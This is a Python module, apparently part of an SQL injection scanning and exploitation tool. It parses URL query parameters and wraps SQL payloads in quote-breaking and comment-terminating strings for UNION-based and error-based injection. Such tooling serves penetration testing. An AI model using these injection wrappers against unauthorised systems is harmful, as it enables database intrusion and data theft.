from __future__ import annotations

from collections.abc import Callable
from urllib.parse import parse_qsl, quote, urlencode, urlsplit, urlunsplit

from engine.models import InjectionContext, InjectionPoint, Param, Target


def parse_target(url: str) -> Target:
    parts = urlsplit(url)
    params = [Param(k, v) for k, v in parse_qsl(parts.query, keep_blank_values=True)]
    base = urlunsplit((parts.scheme, parts.netloc, parts.path, "", ""))
    return Target(url=url, base=base, params=params)


def injection_points(
    target: Target, contexts: list[InjectionContext] | None = None
) -> list[InjectionPoint]:
    contexts = contexts or list(InjectionContext)
    return [
        InjectionPoint(target=target, param=p, context=c)
        for p in target.params
        for c in contexts
    ]


# Enveloppe le payload SQL brut selon le contexte d'injection.
_WRAPPERS: dict[InjectionContext, Callable[[str, str], str]] = {
    InjectionContext.NUMERIC: lambda orig, payload: f"{orig} {payload}",
    InjectionContext.SINGLE_QUOTE: lambda orig, payload: f"{orig}' {payload}-- -",
    InjectionContext.DOUBLE_QUOTE: lambda orig, payload: f'{orig}" {payload}-- -',
    InjectionContext.PAREN_SINGLE: lambda orig, payload: f"{orig}') {payload}-- -",
    InjectionContext.PAREN_NUMERIC: lambda orig, payload: f"{orig}) {payload}-- -",
}


def _rebuild(point: InjectionPoint, new_value: str) -> str:
    pairs = [
        (p.name, new_value if p is point.param else p.value) for p in point.target.params
    ]
    query = urlencode(pairs, quote_via=quote)
    parts = urlsplit(point.target.base)
    return urlunsplit((parts.scheme, parts.netloc, parts.path, query, ""))


def build_url(point: InjectionPoint, payload: str) -> str:
    """URL avec `payload` SQL enveloppé selon le contexte du point (exploitation UNION)."""
    return _rebuild(point, _WRAPPERS[point.context](point.param.value, payload))


def build_raw(point: InjectionPoint, raw_suffix: str) -> str:
    """URL avec `raw_suffix` concaténé brut à la valeur d'origine (sondes error-based)."""
    return _rebuild(point, point.param.value + raw_suffix)
